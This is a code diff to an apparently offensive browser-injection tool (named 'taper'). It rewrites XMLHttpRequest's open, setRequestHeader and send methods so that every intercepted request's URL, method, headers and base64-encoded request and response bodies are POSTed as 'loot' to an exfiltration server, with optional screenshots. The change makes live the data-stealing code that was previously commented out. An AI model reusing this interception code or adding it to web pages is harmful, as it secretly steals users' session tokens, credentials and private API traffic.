@@ -806,7 +806,7 @@ function customFetch(url, options)
 
 
 // Monkey patch API prototypes to intercept API calls
-async function monkeyPatch()
+function monkeyPatch()
 {
 	// console.log("** Enabling API monkey patches...");
 
@@ -817,38 +817,25 @@ async function monkeyPatch()
 
 
 	//Monkey patch open
-	// xhrReference.contentWindow.XMLHttpRequest.prototype.open = function(method, url, async, user, password) 
+	getXhrReference().prototype.open = async function(method, url, async, user, password) 
+	{
+		console.log("-----------------------------------------------");
+		var method = arguments[0];
+		var url = arguments[1];
 
+		// console.log("Intercepted XHR open: " + method + ", " + url);
 
+		if (!this.noIntercept)
+		{
+			// console.log("We need to steal this call!");
+			// send loot
+			// request = new XMLHttpRequest();
+			this._url = url;
+			this._method = method;
+		}
 
-	// getXhrReference().prototype.open = async function(method, url, async, user, password) 
-	// {
-	// 	console.log("-----------------------------------------------");
-	// 	var method = arguments[0];
-	// 	var url = arguments[1];
-
-	// 	console.log("Intercepted XHR open: " + method + ", " + url);
-
-	// 	if (!this.noIntercept)
-	// 	{
-	// 		console.log("We need to steal this call!");
-	// 		// send loot
-	// 		// request = new XMLHttpRequest();
-	// 		request = new window.taperXHR();
-	// 		request.noIntercept = true;
-	// 		request.open("POST", taperexfilServer + "/loot/xhrOpen/" + 
-	// 			sessionStorage.getItem('taperSessionUUID'));
-	// 		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
-
-	// 		var jsonObj = new Object();
-	// 		jsonObj["method"] = method;
-	// 		jsonObj["url"]    = url;
-	// 		var jsonString    = JSON.stringify(jsonObj);
-	// 		await request.send(jsonString);
-	// 	}
-
-	// 	xhrOriginalOpen.apply(this, arguments);
-	// }
+		xhrOriginalOpen.apply(this, arguments);
+	}
 
 
 
@@ -859,108 +846,143 @@ async function monkeyPatch()
 		var header = arguments[0];
 		var value  = arguments[1];
 
-		// var url = this.url;
-
-		// urlHandler = new URL(url);
-		// server = urlHandler.hostname;
-		// port   = urlHandler.port;
-
-		// destinationServer = "https://" + server + ":" + port;
-
-		// We need to make sure we're not intercepting our own
-		// exfiltration calls, we're also using XHR
-		// if (destinationServer != taperexfilServer)
-		// if (isInterceptableHost(this._url))
 		if (!this.noIntercept)
 		{
 			// console.log("$$$ MonekeyURL: " + this.url);
 
-			console.log("Intercepted Header = " + header + ": " + value);
+			// console.log("Intercepted Header = " + header + ": " + value);
 
 
-			request = new XMLHttpRequest();
-		//	request = new window.taperXHR();
-			request.noIntercept = true;
-			request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + 
-			sessionStorage.getItem('taperSessionUUID'));
-			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+			// Check if we already have the dictionary
+			if(!this.hasOwnProperty("_requestHeaders"))
+			{
+				// console.log("The XHR object doesn't have the dictionary yet!");
+				this._requestHeaders = {};
+			}
 
-			var jsonObj = new Object();
-			jsonObj["header"] = header;
-			jsonObj["value"]  = value;
-			var jsonString    = JSON.stringify(jsonObj);
-			await request.send(jsonString);
+			this._requestHeaders[header] = value;
 		}
-		else
-		{
-			console.log("$$$ Not intercepting this setHeader: " + header + ": " + value);
-		}
+		// else
+		// {
+		// 	console.log("$$$ Not intercepting this setHeader: " + header + ": " + value);
+		// }
 
-		console.log("About to apply original setHeader...");
-	 	await xhrOriginalSetHeader.apply(this, arguments);
+		// console.log("About to apply original setHeader...");
+	 	xhrOriginalSetHeader.apply(this, arguments);
 	}
 
 
-  	// Monkey patch send
-	// getXhrReference().prototype.send = async function(data) 
-	// {
-	// 	console.log("-----------------------------------------------");
-	// 	console.log("Intercepted request body: " + data);
+  	// Monkey patch send, pull together all the loot
+	getXhrReference().prototype.send = function(data) 
+	{
+		if (!this.noIntercept)
+		{
 
-	// 	var requestBody = btoa(data);
+			console.log("-----------------------------------------------");
+			console.log("Intercepted request body: " + data);
 
-	// 	if (!this.noIntercept)
-	// 	{
-	// 		this.onreadystatechange = async function()
-	// 		{
-	// 			if (this.readyState === 4)
-	// 			{
-	// 				var data;
+			var requestBody = btoa(data);
 
-	// 				if (!this.responseType || this.responseType === "text") 
-	// 				{
-	// 					data = this.responseText;
-	// 				} 
-	// 				else if (this.responseType === "document") 
-	// 				{
-	// 					data = this.responseXML;
-	// 				} 
-	// 				else if (this.responseType === "json") 
-	// 				{
-	// 					data = JSON.stringify(this.response);
-	// 				} 
-	// 				else 
-	// 				{
-	// 					data = xhr.response;
-	// 				}
+			// Let's get the other information we need
+			var url = this._url;
+			console.log("--- Intercepted url: " + url);
 
-	// 				var responseBody = btoa(data);
-	// 				console.log("Intercepted response: " + data);
+			var method = this._method;
+			console.log("--- Intercepted method: " + method);
 
-	// 			// request = new XMLHttpRequest();
-	// 				request = new window.taperXHR();
-	// 				request.noIntercept = true;
-	// 				request.open("POST", taperexfilServer + "/loot/xhrCall/" + 
-	// 					sessionStorage.getItem('taperSessionUUID'));
-	// 				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+			// Send off the open/setup data
+			// request = new window.taperXHR();
+			request = new XMLHttpRequest();
+			request.noIntercept = true;
+			request.open("POST", taperexfilServer + "/loot/xhrOpen/" + 
+				sessionStorage.getItem('taperSessionUUID'));
+			request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
 
-	// 				var jsonObj = new Object();
-	// 				jsonObj["requestBody"]  = requestBody;
-	// 				jsonObj["responseBody"] = responseBody;
-	// 				var jsonString          = JSON.stringify(jsonObj);
-	// 				await request.send(jsonString);
+			var jsonObj = new Object();
+			jsonObj["method"] = method;
+			jsonObj["url"]    = url;
+			var jsonString    = JSON.stringify(jsonObj);
+			request.send(jsonString);
 
-	// 				// Check if we should take a screenshot now
-	// 				if (window.postApiCallScreenshot)
-	// 				{
-	// 					setTimeout(sendScreenshot, window.screenshotDelay);
-	// 				}
-	// 			}
-	// 		}
-	// 	}
 
-	// 	xhrOriginalSend.apply(this, arguments);
-	// }
+
+			for (header in this._requestHeaders)
+			{
+				console.log("-- header: " + header + ", " + this._requestHeaders[header])
+
+				// Send off the header events
+				request = new XMLHttpRequest();
+				// request = new window.taperXHR();
+				request.noIntercept = true;
+				request.open("POST", taperexfilServer + "/loot/xhrSetHeader/" + 
+					sessionStorage.getItem('taperSessionUUID'));
+				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+				var jsonObj = new Object();
+				jsonObj["header"] = header;
+				jsonObj["value"]  = this._requestHeaders[header];
+				var jsonString    = JSON.stringify(jsonObj);
+			 	request.send(jsonString);
+			}
+
+			console.log("** Intercepting...");
+			this.onreadystatechange = function()
+			{
+				if (this.readyState === 4)
+				{
+					var data;
+
+					if (!this.responseType || this.responseType === "text") 
+					{
+						data = this.responseText;
+					} 
+					else if (this.responseType === "document") 
+					{
+						data = this.responseXML;
+					} 
+					else if (this.responseType === "json") 
+					{
+						data = JSON.stringify(this.response);
+					} 
+					else 
+					{
+						data = xhr.response;
+					}
+
+					var responseBody = btoa(data);
+					console.log("--- Intercepted response: " + data);
+
+
+
+
+					request = new XMLHttpRequest();
+					// request = new window.taperXHR();
+					request.noIntercept = true;
+					request.open("POST", taperexfilServer + "/loot/xhrCall/" + 
+						sessionStorage.getItem('taperSessionUUID'));
+					request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
+
+					var jsonObj = new Object();
+					jsonObj["requestBody"]  = requestBody;
+					jsonObj["responseBody"] = responseBody;
+					var jsonString          = JSON.stringify(jsonObj);
+					request.send(jsonString);
+
+					// Check if we should take a screenshot now
+					if (window.postApiCallScreenshot)
+					{
+						setTimeout(sendScreenshot, window.screenshotDelay);
+					}
+				}
+			}
+		}
+		else
+		{
+			console.log("** Skipping intercept");
+		}
+
+		xhrOriginalSend.apply(this, arguments);
+	}
 
 
 
